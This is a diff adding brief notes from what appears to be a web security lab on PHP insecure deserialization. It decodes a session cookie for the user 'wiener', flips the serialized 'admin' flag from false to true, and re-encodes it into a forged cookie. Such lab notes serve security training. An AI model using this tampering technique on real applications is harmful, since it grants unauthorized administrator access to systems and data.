@@ -1,0 +1,18 @@
+Session Cookie:
+	Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
+
+Session Cookie URL Decoded:
+	Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=
+
+Session Cookie Base 64 Decoded:
+	O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
+
+Session Cookie Admin Attribute Altered:
+	O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
+
+Session Cookie Base 64 Encoded:
+	Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
+
+Session Cookie URL Encoded: 
+	Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
+
